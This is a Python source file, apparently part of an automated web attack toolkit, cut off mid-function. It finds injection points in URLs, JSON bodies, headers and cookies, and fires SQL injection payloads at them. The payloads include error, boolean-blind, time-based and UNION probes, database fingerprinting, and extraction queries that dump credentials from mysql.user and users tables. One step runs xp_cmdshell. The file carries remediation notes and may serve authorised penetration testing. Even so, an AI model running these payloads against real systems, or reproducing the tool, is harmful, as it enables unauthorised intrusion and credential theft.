from __future__ import annotations

import base64
import difflib
import hashlib
import html
import json
import logging
import math
import re
import string
import threading
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from itertools import product
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
from urllib.parse import (
    parse_qs, quote, urlencode, urljoin, urlparse, urlunparse,
)

import requests
from requests import Response
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class VulnClass(Enum):
    SQLI_ERROR          = "sqli_error_based"
    SQLI_BLIND_BOOL     = "sqli_blind_boolean"
    SQLI_BLIND_TIME     = "sqli_blind_time_based"
    SQLI_UNION          = "sqli_union_extraction"
    SQLI_OOB            = "sqli_out_of_band"
    SQLI_STACKED        = "sqli_stacked_queries"
    SQLI_NOSQL          = "sqli_nosql_operator"
    XSS_REFLECTED       = "xss_reflected"
    XSS_STORED          = "xss_stored_beacon"
    XSS_DOM             = "xss_dom_sink"
    XSS_MUTATION        = "xss_mutation_mxss"
    XSS_HEADER_INJECT   = "xss_via_response_header"
    SSTI_DETECT         = "ssti_detection"
    SSTI_RCE            = "ssti_rce_chain"
    SSTI_SANDBOX_ESCAPE = "ssti_sandbox_escape"
    IDOR_NUMERIC        = "idor_numeric_enumeration"
    IDOR_OBJECT_GRAPH   = "idor_object_graph_reference"
    IDOR_MASS_ASSIGN    = "idor_mass_assignment"
    IDOR_JWT_CLAIM      = "idor_jwt_claim_substitution"
    IDOR_GUID_PREDICT   = "idor_guid_predictability"
    CHAIN_SQLI_TO_RCE   = "chain_sqli_to_rce"
    CHAIN_XSS_TO_EXFIL  = "chain_xss_to_account_takeover"
    CHAIN_SSTI_TO_PIVOT = "chain_ssti_to_pivot"


class DbEngine(Enum):
    MYSQL      = "mysql"
    POSTGRES   = "postgresql"
    MSSQL      = "mssql"
    ORACLE     = "oracle"
    SQLITE     = "sqlite"
    MONGODB    = "mongodb"
    UNKNOWN    = "unknown"


class SstiEngine(Enum):
    JINJA2       = "jinja2"
    TWIG         = "twig"
    FREEMARKER   = "freemarker"
    VELOCITY     = "velocity"
    SMARTY       = "smarty"
    PEBBLE       = "pebble"
    ERB          = "erb"
    EL           = "el"
    THYMELEAF    = "thymeleaf"
    UNKNOWN      = "unknown"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class InjectPoint:
    """A single injectable location — URL param, path, header, JSON field, cookie."""
    url:         str
    param:       str
    method:      str                    # GET | POST | PUT | PATCH
    location:    str                    # url_param | json_body | header | cookie | path
    original:    str = ""               # original param value if known
    content_type: str = ""
    extra_params: Dict[str, str] = field(default_factory=dict)
    source:      str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url, "param": self.param,
            "method": self.method, "location": self.location,
            "source": self.source,
        }


@dataclass
class VulnFinding:
    finding_id:    str
    vuln_class:    VulnClass
    severity:      FindingSeverity
    status:        FindingStatus
    target_url:    str
    param:         str
    payload:       str
    evidence:      Dict[str, Any]
    exploitation:  Dict[str, Any]      # next-stage exploitation details
    attack_chain:  List[str]
    remediation:   str
    notes:         str
    db_engine:     Optional[DbEngine] = None
    ssti_engine:   Optional[SstiEngine] = None
    beacon_id:     Optional[str] = None  # for stored XSS tracking
    timestamp:     datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":  self.finding_id,
            "vuln_class":  self.vuln_class.value,
            "severity":    self.severity.name,
            "status":      self.status.name,
            "target_url":  self.target_url,
            "param":       self.param,
            "payload":     self.payload[:600],
            "evidence":    self.evidence,
            "exploitation": self.exploitation,
            "attack_chain": self.attack_chain,
            "remediation": self.remediation,
            "notes":       self.notes,
            "db_engine":   self.db_engine.value if self.db_engine else None,
            "ssti_engine": self.ssti_engine.value if self.ssti_engine else None,
            "beacon_id":   self.beacon_id,
            "timestamp":   self.timestamp.isoformat(),
        }


@dataclass
class VulnScanResult:
    run_id:              str
    domain:              str
    inject_points_tested: int
    findings:            List[Dict[str, Any]]
    sqli_confirmed:      bool
    xss_confirmed:       bool
    ssti_rce:            bool
    idor_confirmed:      bool
    chains_found:        List[str]
    score:               float
    risk_level:          str
    recommendations:     List[str]
    started_at:          datetime
    finished_at:         datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":               self.run_id,
            "domain":               self.domain,
            "inject_points_tested": self.inject_points_tested,
            "findings":             self.findings,
            "sqli_confirmed":       self.sqli_confirmed,
            "xss_confirmed":        self.xss_confirmed,
            "ssti_rce":             self.ssti_rce,
            "idor_confirmed":       self.idor_confirmed,
            "chains_found":         self.chains_found,
            "score":                round(self.score, 2),
            "risk_level":           self.risk_level,
            "recommendations":      self.recommendations,
            "started_at":           self.started_at.isoformat(),
            "finished_at":          self.finished_at.isoformat(),
            "duration_s":           round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP pool
# ─────────────────────────────────────────────────────────────────────────────

class _HttpPool:
    _UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, timeout: float = 10.0, delay: float = 0.3,
                 verify_tls: bool = False):
        self._timeout = timeout
        self._delay   = delay
        self._verify  = verify_tls
        self._local   = threading.local()
        self._last    = threading.local()

    def _sess(self) -> requests.Session:
        if not hasattr(self._local, "s"):
            s = requests.Session()
            s.headers["User-Agent"] = self._UA
            s.verify = self._verify
            s.max_redirects = 5
            self._local.s = s
        return self._local.s

    def _throttle(self) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last.ts = time.time()

    def send(
        self,
        pt:      InjectPoint,
        payload: str,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Response]:
        """Route request based on InjectPoint.location."""
        self._throttle()
        try:
            if pt.location == "url_param":
                return self._get_param(pt.url, pt.param, payload, extra_headers)
            elif pt.location == "json_body":
                return self._post_json(pt.url, pt.param, payload, extra_headers)
            elif pt.location == "header":
                return self._get_header(pt.url, pt.param, payload, extra_headers)
            elif pt.location == "cookie":
                return self._get_cookie(pt.url, pt.param, payload)
            elif pt.location == "path":
                return self._get_path(pt.url, pt.param, payload, extra_headers)
            else:
                return self._post_form(pt.url, pt.param, payload,
                                       pt.extra_params, extra_headers)
        except RequestException as e:
            logger.debug("send %s/%s: %s", pt.url, pt.param, e)
            return None

    def raw_get(self, url: str, headers: Optional[Dict[str, str]] = None,
                params: Optional[Dict[str, str]] = None) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().get(url, headers=headers or {},
                                    params=params, timeout=self._timeout)
        except RequestException as e:
            logger.debug("raw_get %s: %s", url, e)
            return None

    def raw_post(self, url: str, data: Optional[Any] = None,
                 json_body: Optional[Any] = None,
                 headers: Optional[Dict[str, str]] = None) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().post(url, data=data, json=json_body,
                                     headers=headers or {},
                                     timeout=self._timeout)
        except RequestException as e:
            logger.debug("raw_post %s: %s", url, e)
            return None

    # ── private send methods ──────────────────────────────────────────────────

    def _get_param(self, url, param, payload, hdrs):
        parsed = urlparse(url)
        qs     = {k: v[0] for k, v in parse_qs(parsed.query).items()}
        qs[param] = payload
        new_url = urlunparse(parsed._replace(
            query=urlencode(qs, quote_via=quote)
        ))
        return self._sess().get(new_url, headers=hdrs or {},
                                timeout=self._timeout, allow_redirects=True)

    def _post_form(self, url, param, payload, extra, hdrs):
        data = {**extra, param: payload}
        return self._sess().post(url, data=data, headers=hdrs or {},
                                 timeout=self._timeout, allow_redirects=True)

    def _post_json(self, url, param, payload, hdrs):
        body = {param: payload}
        h    = {"Content-Type": "application/json", **(hdrs or {})}
        return self._sess().post(url, json=body, headers=h,
                                 timeout=self._timeout, allow_redirects=True)

    def _get_header(self, url, header_name, payload, hdrs):
        h = {**(hdrs or {}), header_name: payload}
        return self._sess().get(url, headers=h,
                                timeout=self._timeout, allow_redirects=True)

    def _get_cookie(self, url, cookie_name, payload):
        return self._sess().get(url, cookies={cookie_name: payload},
                                timeout=self._timeout, allow_redirects=True)

    def _get_path(self, url, _param, payload, hdrs):
        # append payload as extra path segment
        u = url.rstrip("/") + "/" + quote(payload, safe="")
        return self._sess().get(u, headers=hdrs or {},
                                timeout=self._timeout, allow_redirects=True)

    def reset(self) -> None:
        if hasattr(self._local, "s"):
            self._local.s.close()
            del self._local.s


# ─────────────────────────────────────────────────────────────────────────────
# Inject point builder — unified extraction from scan_results
# ─────────────────────────────────────────────────────────────────────────────

class _InjectPointBuilder:
    """
    Builds InjectPoint objects from every scan_results source.
    Avoids duplicating URL-param discovery already done in LFI/SSRF modules.
    Focuses on: JSON API bodies, cookie injection, header injection,
    path parameter sequences, and form fields discovered by enumeration.
    """

    _HEADER_INJECT_TARGETS: List[str] = [
        "X-Forwarded-For", "X-Original-URL", "X-Rewrite-URL",
        "User-Agent", "Referer", "X-Custom-IP-Authorization",
        "X-Api-Version", "Accept-Language", "Accept",
    ]

    _COOKIE_HINTS: List[str] = [
        "id", "user", "uid", "account", "role", "token",
        "session", "auth", "pref", "theme", "lang",
    ]

    _JSON_API_PATHS: List[str] = [
        "/api/v1/", "/api/v2/", "/api/", "/graphql",
        "/rest/", "/services/", "/data/",
    ]

    _JSON_PARAMS: List[str] = [
        "id", "user_id", "userId", "account_id", "accountId",
        "query", "search", "filter", "where", "field",
        "name", "email", "username", "password", "content",
        "message", "template", "subject", "body", "data",
        "value", "key", "type", "category", "tag", "label",
    ]

    def build(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> List[InjectPoint]:
        pts:  List[InjectPoint] = []
        seen: Set[Tuple[str, str, str]] = set()

        def add(p: InjectPoint) -> None:
            key = (p.url, p.param, p.location)
            if key not in seen:
                seen.add(key)
                pts.append(p)

        # 1. payload_analysis.injection_points (already discovered)
        pa = scan_results.get("payload_analysis", {})
        for ip in pa.get("injection_points", []):
            url    = ip.get("url", "")
            method = ip.get("method", "GET").upper()
            pt     = ip.get("param_type", "url_param")
            if not url:
                continue
            notes = ip.get("notes", "")
            
            if pt == "url_param":
                parsed = urlparse(url)
                qs     = parse_qs(parsed.query)
                for pname in (qs.keys() or ["q", "search", "id", "name"]):
                    add(InjectPoint(
                        url=url, param=pname, method=method,
                        location="url_param", source="payload_analysis",
                    ))
                    
            elif pt == "json_body":
                for pname in self._JSON_PARAMS[:12]:
                    add(InjectPoint(
                        url=url, param=pname, method="POST",
                        location="json_body",
                        content_type="application/json",
                        source="payload_analysis",
                    ))

            elif pt == "form_fields":
                for pname in ["username", "password", "email",
                              "search", "query", "name", "message"]:
                    add(InjectPoint(
                        url=url, param=pname, method="POST",
                        location="form_post", source="payload_analysis",
                    ))

            elif pt == "path_param":
                # path parameter: /user/1 → /user/{id}
                add(InjectPoint(
                    url=url, param="id", method="GET",
                    location="path", source="payload_analysis",
                ))

        # 2. JSON API endpoints — tech_detection base + known JSON paths
        base_urls: List[str] = []
        for t_url in scan_results.get("tech_detection", {}):
            parsed = urlparse(t_url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            if base not in base_urls:
                base_urls.append(base)

        for base in base_urls:
            for path in self._JSON_API_PATHS:
                for pname in self._JSON_PARAMS[:8]:
                    add(InjectPoint(
                        url=base + path, param=pname, method="POST",
                        location="json_body",
                        content_type="application/json",
                        source="json_api_guess",
                    ))

        # 3. Header injection points (all base URLs)
        for base in base_urls[:3]:
            for hdr in self._HEADER_INJECT_TARGETS:
                add(InjectPoint(
                    url=base + "/", param=hdr, method="GET",
                    location="header", source="header_inject",
                ))

        # 4. Cookie injection (from header_analysis cookies)
        for url, td in scan_results.get("header_analysis", {}).get("targets", {}).items():
            raw = td.get("raw_headers_sample", {})
            for k, v in raw.items():
                if k.lower() == "set-cookie":
                    # parse name from Set-Cookie
                    ck_name = v.split("=")[0].strip()
                    if any(h in ck_name.lower() for h in self._COOKIE_HINTS):
                        add(InjectPoint(
                            url=url, param=ck_name, method="GET",
                            location="cookie", source="header_analysis_cookie",
                        ))

        # 5. IDOR-specific: REST path segments with numeric IDs
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            scheme = "https" if sub.get("https_status") else "http"
            base   = f"{scheme}://{sub['subdomain']}"
            for path_tmpl in [
                "/api/users/1", "/api/accounts/1", "/api/orders/1",
                "/api/posts/1", "/api/documents/1", "/api/files/1",
                "/user/1/profile", "/account/1", "/admin/users/1",
                "/v1/resource/1", "/api/v1/item/1",
            ]:
                add(InjectPoint(
                    url=base + path_tmpl, param="id",
                    method="GET", location="path",
                    source="idor_path_guess",
                ))
            # Also try JSON POST APIs
            for path in ["/api/query", "/api/search", "/graphql"]:
                for pname in ["id", "user_id", "query"]:
                    add(InjectPoint(
                        url=base + path, param=pname,
                        method="POST", location="json_body",
                        content_type="application/json",
                        source="json_api_guess",
                    ))

        # 6. OSINT exposed paths — URL params that look injectable
        for pe in scan_results.get("osint_correlation", {}).get("exposed_paths", [])[:20]:
            ep_url = pe.get("url") or pe.get("path", "")
            if not ep_url or not ep_url.startswith("http"):
                continue
            parsed = urlparse(ep_url)
            qs     = parse_qs(parsed.query)
            for pname, vals in qs.items():
                add(InjectPoint(
                    url=ep_url, param=pname, method="GET",
                    location="url_param",
                    original=vals[0] if vals else "",
                    source="osint_exposed",
                ))

        return pts


# ─────────────────────────────────────────────────────────────────────────────
# Differential response engine — core of blind detection
# ─────────────────────────────────────────────────────────────────────────────

class _DifferentialEngine:
    """
    Sends three requests and compares them statistically:
      baseline (benign value)
      true-condition payload
      false-condition payload

    Comparison axes:
      - Status code delta
      - Body length delta
      - Token presence/absence (keyword set comparison)
      - Structural similarity ratio (difflib SequenceMatcher)
      - Response time delta (for time-based blind)

    Returns a DiffResult with confidence score 0.0–1.0 per axis.
    """

    @dataclass
    class DiffResult:
        status_delta:  int
        len_delta_tf:  int         # len(true) - len(false)
        len_delta_tb:  int         # len(true) - len(baseline)
        sim_true_base: float       # 0–1 similarity: true vs baseline
        sim_false_base:float
        keyword_hit:   bool
        keyword:       str
        time_delta_s:  float       # response time true - baseline
        confidence:    float       # 0–1 aggregate

    _BENIGN_VALUES: List[str] = [
        "1", "test", "example", "hello", "world",
    ]

    def run(
        self,
        http:        _HttpPool,
        pt:          InjectPoint,
        true_payload: str,
        false_payload: str,
        keywords:    Optional[List[str]] = None,
    ) -> "DiffResult":
        benign = pt.original or self._BENIGN_VALUES[0]

        t0 = time.perf_counter()
        r_base  = http.send(pt, benign)
        t_base  = time.perf_counter() - t0

        t0 = time.perf_counter()
        r_true  = http.send(pt, true_payload)
        t_true  = time.perf_counter() - t0

        r_false = http.send(pt, false_payload)

        body_base  = r_base.text  if r_base  else ""
        body_true  = r_true.text  if r_true  else ""
        body_false = r_false.text if r_false else ""

        len_b  = len(body_base)
        len_t  = len(body_true)
        len_f  = len(body_false)

        sc_base  = r_base.status_code  if r_base  else 0
        sc_true  = r_true.status_code  if r_true  else 0

        sim_tb = difflib.SequenceMatcher(None, body_true, body_base).ratio()
        sim_fb = difflib.SequenceMatcher(None, body_false, body_base).ratio()

        kw_hit  = False
        kw_name = ""
        if keywords:
            for kw in keywords:
                if kw.lower() in body_true.lower() and kw.lower() not in body_base.lower():
                    kw_hit  = True
                    kw_name = kw
                    break

        time_delta = t_true - t_base

        # Confidence scoring
        conf = 0.0
        if sc_true != sc_base and sc_true in (200, 302):
            conf += 0.25
        if abs(len_t - len_f) > 50 and abs(len_t - len_b) > 50:
            conf += 0.30
        if sim_tb < 0.85 and sim_fb > 0.90:
            conf += 0.25
        if kw_hit:
            conf += 0.40
        if time_delta > 4.0:
            conf += 0.50

        return self.DiffResult(
            status_delta   = sc_true - sc_base,
            len_delta_tf   = len_t - len_f,
            len_delta_tb   = len_t - len_b,
            sim_true_base  = sim_tb,
            sim_false_base = sim_fb,
            keyword_hit    = kw_hit,
            keyword        = kw_name,
            time_delta_s   = time_delta,
            confidence     = min(1.0, conf),
        )


# ─────────────────────────────────────────────────────────────────────────────
# DB engine fingerprinter
# ─────────────────────────────────────────────────────────────────────────────

class _DbFingerprinter:
    """
    Sends DB-specific error-triggering payloads and matches error strings
    to identify the backend RDBMS. Used to select targeted extraction chains.
    """

    _PROBE_MAP: List[Tuple[str, DbEngine, re.Pattern]] = [
        ("' AND extractvalue(1,concat(0x7e,version()))-- -",
         DbEngine.MYSQL,
         re.compile(r"You have an error in your SQL|XPATH syntax|extractvalue", re.I)),
        ("' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))-- -",
         DbEngine.MSSQL,
         re.compile(r"Conversion failed|mssql|Microsoft SQL Server|Incorrect syntax", re.I)),
        ("' AND 1=CAST((SELECT version()) AS int)-- -",
         DbEngine.POSTGRES,
         re.compile(r"ERROR:\s+invalid input syntax|PostgreSQL|pg_", re.I)),
        ("' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v\$version WHERE ROWNUM=1))-- -",
         DbEngine.ORACLE,
         re.compile(r"ORA-\d+|Oracle.*error", re.I)),
        ("' UNION SELECT NULL,sqlite_version()-- -",
         DbEngine.SQLITE,
         re.compile(r"SQLite|no such table|near .* syntax error", re.I)),
        ('{"$gt": ""}',
         DbEngine.MONGODB,
         re.compile(r"mongo|bson|ObjectId|CastError|BSON", re.I)),
    ]

    def fingerprint(
        self,
        http: _HttpPool,
        pt:   InjectPoint,
    ) -> DbEngine:
        for payload, engine, pat in self._PROBE_MAP:
            resp = http.send(pt, payload)
            if resp and pat.search(resp.text or ""):
                return engine
        return DbEngine.UNKNOWN


# ─────────────────────────────────────────────────────────────────────────────
# UNION column-counter — determines column count + injectable column index
# ─────────────────────────────────────────────────────────────────────────────

class _UnionExplorer:
    """
    Finds the UNION SELECT column count by binary search (1-20 columns).
    Then identifies which column index is reflected in the response
    for string-type extraction.
    Max columns probed: 20.
    """

    _MARKER = "ARTEX_UNION_MARKER"

    def find_columns(
        self,
        http: _HttpPool,
        pt:   InjectPoint,
        db:   DbEngine,
    ) -> Optional[Tuple[int, int]]:
        """Returns (column_count, injectable_column_index) or None."""
        for n in range(1, 21):
            nulls   = ",".join(["NULL"] * n)
            payload = f"' UNION SELECT {nulls}-- -"
            resp    = http.send(pt, payload)
            if resp and resp.status_code in (200, 302) and len(resp.text) > 10:
                # find which column reflects strings
                for idx in range(n):
                    cols = ["NULL"] * n
                    cols[idx] = f"'{self._MARKER}'"
                    p2   = f"' UNION SELECT {','.join(cols)}-- -"
                    r2   = http.send(pt, p2)
                    if r2 and self._MARKER in (r2.text or ""):
                        return n, idx
                return n, 0   # found column count but no reflection — still useful
        return None


# ─────────────────────────────────────────────────────────────────────────────
# SQLi extractor — targeted extraction chain post-confirmation
# ─────────────────────────────────────────────────────────────────────────────

class _SqliExtractor:
    """
    After confirmation, builds extraction payloads to demonstrate impact.
    Extracts: DB version, current user, current DB name, first table name,
    first user/password from common auth tables.
    Does NOT replace AI_payload_generator payloads — uses them as seeds
    and adds schema-aware chains on top.
    """

    _EXTRACT_MYSQL: List[Tuple[str, str]] = [
        ("version",       "SELECT version()"),
        ("current_user",  "SELECT current_user()"),
        ("database",      "SELECT database()"),
        ("first_table",   "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1"),
        ("first_column",  "SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1"),
        ("user_table",    "SELECT CONCAT(user,0x3a,password) FROM mysql.user LIMIT 1"),
        ("auth_table",    "SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1"),
    ]

    _EXTRACT_POSTGRES: List[Tuple[str, str]] = [
        ("version",       "SELECT version()"),
        ("current_user",  "SELECT current_user"),
        ("database",      "SELECT current_database()"),
        ("first_table",   "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1"),
        ("auth_table",    "SELECT username||':'||password FROM users LIMIT 1"),
    ]

    _EXTRACT_MSSQL: List[Tuple[str, str]] = [
        ("version",       "SELECT @@version"),
        ("current_user",  "SELECT SYSTEM_USER"),
        ("database",      "SELECT DB_NAME()"),
        ("first_table",   "SELECT TOP 1 table_name FROM information_schema.tables"),
        ("auth_table",    "SELECT TOP 1 username+':'+password FROM users"),
        ("xp_cmdshell",   "EXEC xp_cmdshell('whoami')"),
    ]

    _EXTRACT_ORACLE: List[Tuple[str, str]] = [
        ("version",       "SELECT banner FROM v$version WHERE ROWNUM=1"),
        ("current_user",  "SELECT user FROM dual"),
        ("first_table",   "SELECT table_name FROM all_tables WHERE ROWNUM=1"),
    ]

    def build_chain(
        self,
        db:          DbEngine,
        col_count:   int,
        col_idx:     int,
        pt:          InjectPoint,
        http:        _HttpPool,
    ) -> Dict[str, str]:
        """
        Returns dict of {label: extracted_value} for each extraction query.
        Caps at 5 queries to avoid flooding.
        """
        extractions = self._select_extractions(db)[:5]
        results: Dict[str, str] = {}

        for label, sql in extractions:
            cols    = ["NULL"] * col_count
            cols[col_idx] = f"({sql})"
            payload = f"' UNION SELECT {','.join(cols)}-- -"
            resp    = http.send(pt, payload)
            if not resp:
                continue
            # Find the extracted value between our null markers
            # Look for non-HTML printable text that appeared vs baseline
            body = resp.text or ""
            # Simple heuristic: find alphanumeric value that looks like DB output
            m = re.search(
                r'[0-9]+\.[0-9]+\.[0-9]+|root@|current_user|'
                r'[a-z_]+:[a-z0-9!@#$%]+|public\.[a-z_]+|'
                r'Microsoft SQL Server \d{4}|Oracle Database',
                body, re.I,
            )
            if m:
                results[label] = m.group(0)[:120]

        return results


    def _select_extractions(self, db: DbEngine) -> List[Tuple[str, str]]:
        return {
            DbEngine.MYSQL:    self._EXTRACT_MYSQL,
            DbEngine.POSTGRES: self._EXTRACT_POSTGRES,
            DbEngine.MSSQL:    self._EXTRACT_MSSQL,
            DbEngine.ORACLE:   self._EXTRACT_ORACLE,
        }.get(db, self._EXTRACT_MYSQL)


# ─────────────────────────────────────────────────────────────────────────────
# SQLi probe engine
# ─────────────────────────────────────────────────────────────────────────────

class _SqliProbe:
    """
    Runs all SQLi detection methods against one InjectPoint.
    Uses AI_payload_generator payloads via scan_results (not re-defined here).
    New capability:
    - Multi-stage: detect → fingerprint → column-count → extraction chain
    - Stacked query detection (;SELECT SLEEP vs ;WAITFOR)
    - NoSQL operator injection ($gt/$ne/$where) for JSON endpoints
    - OOB DNS channel detection (LOAD_FILE DNS ping)
    """

    _ERROR_SIGS: List[re.Pattern] = [
        re.compile(r"you have an error in your sql", re.I),
        re.compile(r"warning:\s+mysql", re.I),
        re.compile(r"unclosed quotation mark", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"pg_query\(\)|pg_exec\(\)", re.I),
        re.compile(r"ERROR:\s+syntax error at", re.I),
        re.compile(r"microsoft.*ole db.*provider", re.I),
        re.compile(r"odbc.*microsoft.*access", re.I),
        re.compile(r"ora-\d{4,5}", re.I),
        re.compile(r"sql syntax.*near|syntax error.*line", re.I),
        re.compile(r"unexpected token|bad sql grammar", re.I),
        re.compile(r"mysqli_fetch|mysql_num_rows", re.I),
        re.compile(r"sqlstate\[", re.I),
        re.compile(r"db2.*sql.*error", re.I),
        re.compile(r"sqlite_step\(\)", re.I),
        re.compile(r"column.*does not exist", re.I),
        re.compile(r"operator does not exist", re.I),
        re.compile(r"invalid.*column.*name", re.I),
    ]

    _NOSQL_TRUE_PAYLOAD  = '{"$gt": ""}'
    _NOSQL_FALSE_PAYLOAD = '{"$gt": "ZZZZZZZZ_ARTEX_FALSE"}'

    def __init__(
        self,
        http:        _HttpPool,
        diff:        _DifferentialEngine,
        fingerprinter: _DbFingerprinter,
        union_exp:   _UnionExplorer,
        extractor:   _SqliExtractor,
    ):
        self._http  = http
        self._diff  = diff
        self._fp    = fingerprinter
        self._union = union_exp
        self._ext   = extractor

    def probe(
        self,
        pt:           InjectPoint,
        payload_pool: List[str],
    ) -> List[VulnFinding]:
        findings: List[VulnFinding] = []

        # ── Stage 1: Error-based detection ───────────────────────────────────
        error_finding = self._probe_error(pt, payload_pool)
        if error_finding:
            findings.append(error_finding)

        # ── Stage 2: Boolean blind (differential) ────────────────────────────
        bool_finding = self._probe_bool_blind(pt)
        if bool_finding:
            findings.append(bool_finding)

        # ── Stage 3: Time-based blind ─────────────────────────────────────────
        time_finding = self._probe_time_blind(pt)
        if time_finding:
            findings.append(time_finding)

        # ── Stage 4: UNION extraction (only if error/bool confirmed) ──────────
        if findings:
            union_finding = self._probe_union(pt, findings[0])
            if union_finding:
                findings.append(union_finding)

        # ── Stage 5: Stacked queries ──────────────────────────────────────────
        stacked = self._probe_stacked(pt)
        if stacked:
            findings.append(stacked)

        # ── Stage 6: NoSQL operator (JSON endpoints only) ─────────────────────
        if pt.location == "json_body":
            nosql = self._probe_nosql(pt)
            if nosql:
                findings.append(nosql)

        # ── Stage 7: OOB DNS channel ──────────────────────────────────────────
        oob = self._probe_oob(pt)
        if oob:
            findings.append(oob)

        return findings

    # ── error-based ───────────────────────────────────────────────────────────

    def _probe_error(
        self, pt: InjectPoint, pool: List[str]
    ) -> Optional[VulnFinding]:
        # Use payloads from AI_payload_generator via pool, plus a few triggers
        triggers = [
            "' AND extractvalue(1,concat(0x7e,version()))-- -",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
            "FROM information_schema.tables GROUP BY x)a)-- -",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -",
            "' AND 1=CAST((SELECT version()) AS int)-- -",
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -",
        ] + pool[:8]

        for payload in triggers:
            resp = self._http.send(pt, payload)
            if not resp:
                continue
            body = resp.text or ""
            for sig in self._ERROR_SIGS:
                m = sig.search(body)
                if m:
                    db = self._fp.fingerprint(self._http, pt)
                    return VulnFinding(
                        finding_id = str(uuid.uuid4()),
                        vuln_class = VulnClass.SQLI_ERROR,
                        severity   = FindingSeverity.CRITICAL,
                        status     = FindingStatus.CONFIRMED,
                        target_url = pt.url,
                        param      = pt.param,
                        payload    = payload,
                        evidence   = {
                            "error_match":   m.group(0)[:200],
                            "pattern":       sig.pattern,
                            "status_code":   resp.status_code,
                            "body_len":      len(body),
                        },
                        exploitation = {
                            "next_step": "UNION extraction or blind exfil",
                            "db_engine": db.value,
                        },
                        attack_chain = [
                            f"Inject error trigger into {pt.param}",
                            f"DB error leaks version info: {m.group(0)[:80]}",
                            "Fingerprint DB engine → build targeted UNION extraction chain",
                            "Dump credentials from auth tables",
                        ],
                        remediation = "Parameterise all queries; never concatenate user input into SQL.",
                        notes       = f"SQL error signature matched: {sig.pattern}",
                        db_engine   = db,
                    )
        return None

    # ── boolean blind ─────────────────────────────────────────────────────────

    def _probe_bool_blind(self, pt: InjectPoint) -> Optional[VulnFinding]:
        # True/false pair targeting version() first char to get a meaningful oracle
        true_p  = "' AND SUBSTRING(version(),1,1)>='1'-- -"
        false_p = "' AND SUBSTRING(version(),1,1)='Z'-- -"

        diff = self._diff.run(self._http, pt, true_p, false_p,
                              keywords=["user", "admin", "dashboard"])
        if diff.confidence < 0.55:
            # Try numeric param style
            true_p  = "1 AND 1=1-- -"
            false_p = "1 AND 1=2-- -"
            diff    = self._diff.run(self._http, pt, true_p, false_p)

        if diff.confidence < 0.55:
            return None

        db = self._fp.fingerprint(self._http, pt)
        return VulnFinding(
            finding_id = str(uuid.uuid4()),
            vuln_class = VulnClass.SQLI_BLIND_BOOL,
            severity   = FindingSeverity.HIGH,
            status     = FindingStatus.CONFIRMED if diff.confidence > 0.75
                         else FindingStatus.LIKELY,
            target_url = pt.url,
            param      = pt.param,
            payload    = true_p,
            evidence   = {
                "confidence":    round(diff.confidence, 3),
                "len_delta_tf":  diff.len_delta_tf,
                "len_delta_tb":  diff.len_delta_tb,
                "sim_true_base": round(diff.sim_true_base, 3),
                "keyword_hit":   diff.keyword_hit,
            },
            exploitation = {
                "technique":  "binary search character extraction",
                "tool":       "sqlmap --technique=B",
                "example":    "' AND SUBSTRING((SELECT database()),1,1)='a'-- -",
            },
            attack_chain = [
                f"Boolean true payload ({true_p[:40]}...) returns different response vs false",
                f"Differential confidence: {diff.confidence:.2f}",
                "Enumerate DB char-by-char via SUBSTRING() binary search",
                "Extract version → DB name → table names → credentials",
            ],
            remediation = "Parameterise all queries. Run sqlmap --level=5 for full audit.",
            notes       = f"Boolean blind SQLi — differential confidence {diff.confidence:.2f}",
            db_engine   = db,
        )

    # ── time-based blind ──────────────────────────────────────────────────────

    def _probe_time_blind(self, pt: InjectPoint) -> Optional[VulnFinding]:
        time_payloads: List[Tuple[str, float]] = [
            ("' AND SLEEP(5)-- -",                    5.0),
            ("'; WAITFOR DELAY '0:0:5'-- -",          5.0),
            ("' AND 1=(SELECT 1 FROM pg_sleep(5))-- -", 5.0),
            ("' OR SLEEP(5)-- -",                     5.0),
            ("1; SELECT SLEEP(5)-- -",                5.0),
        ]

        for payload, expected_delay in time_payloads:
            t0   = time.perf_counter()
            resp = self._http.send(pt, payload)
            dt   = time.perf_counter() - t0

            if dt >= expected_delay * 0.80:  # 80% of expected delay = hit
                db = self._fp.fingerprint(self._http, pt)
                return VulnFinding(
